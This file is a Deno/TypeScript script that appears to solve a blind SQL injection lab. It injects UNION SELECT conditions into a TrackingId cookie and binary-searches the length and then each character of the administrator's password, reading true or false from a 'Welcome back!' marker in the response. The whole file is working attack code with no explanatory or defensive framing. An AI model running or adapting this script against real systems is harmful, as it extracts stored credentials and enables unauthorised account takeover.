import axios, {AxiosResponse} from "npm:axios@latest";

const HOST = "DOMAIN_HERE";
const SESSION = "SESSION_COOKIE_HERE";

function sleep(time: number): Promise<void> {
    return new Promise((resolve) => {
        setTimeout(() => {
                resolve();
        }, time)
    })
}


async function compareWithRemote(condition?: string) {
    await sleep(100);
    const query = `' UNION SELECT password from users WHERE username = 'administrator' AND ${condition} --`
    const res = await axios.get(`https://${HOST}/`, {
        headers: {
            Cookie: `TrackingId=${query};Session=${SESSION}`
        }
    })
    return isTrue(res);
}

async function findLengthOfPassword(higher: number, lower: number): Promise<number> {
    const value = Math.floor((higher + lower) / 2);
    if(value === lower || value === higher) {
        const isEqual = await compareWithRemote(`password = ${value}`);
        if(!isEqual)
            throw new Error("No possibilities");
        return value;
    }
    console.log(`LENTH(password) < ${value}`)
    const isLower = await compareWithRemote(`LENGTH(password) < ${value}`);
    if(isLower)
        return findLengthOfPassword(value, lower);
    
    const isHigher = await compareWithRemote(`LENGTH(password) > ${value}`)
    if(isHigher)
        return await findLengthOfPassword(higher, value);
    
    const isEqual = await compareWithRemote(`LENGTH(password) = ${value}`);

    if(!isEqual)
        throw new Error("No possibilities");
    return value;
}

async function findPassword(length: number): Promise<string> {
    let password = '';

    for(let i = 1; i <= length; i++) {
        password += await findCharOfPassword('!', 'z', i);
        await Deno.stdout.write(new TextEncoder().encode(`Password guess: ${password}\r`))
    }

    await Deno.stdout.write(new TextEncoder().encode(`\n`))

    return password;
}

async function findCharOfPassword(higher: string, lower: string, index: number): Promise<string> {
    const value = String.fromCharCode(Math.floor((higher.charCodeAt(0) + lower.charCodeAt(0)) / 2));
    if(value === lower || value === higher) {
        const isEqual = await compareWithRemote(`SUBSTRING(password, ${index}, 1) = '${value}'`);
        if(!isEqual)
            throw new Error("Not the right character");
        return value;
    }
    
    // Don't know why it's > instead of < but Ig we'll roll with it
    const isLower = await compareWithRemote(`SUBSTRING(password, ${index}, 1) > '${value}'`);
    if(isLower)
        return findCharOfPassword(value, lower, index);

    const isHigher = await compareWithRemote(`SUBSTRING(password, ${index}, 1) < '${value}'`)
    if(isHigher)
        return findCharOfPassword(higher, value, index);

    const isEqual = await compareWithRemote(`SUBSTRING(password, ${index}, 1) = '${value}'`);
    if(!isEqual)
        throw new Error("No possibilities");
    return value;
}

function isTrue(response: AxiosResponse<string>) {
    return response.data.includes("<div>Welcome back!</div>")
}


const length = await findLengthOfPassword(100, 0);
console.log(`Passwordlength is: ${length}`);
const password = await findPassword(length);
const passwordMatch = await compareWithRemote(`password = '${password}'`)
if(!passwordMatch) {
    console.error("Password does not match");
    Deno.exit(1);
}

console.log(`Password is: ${password}`);
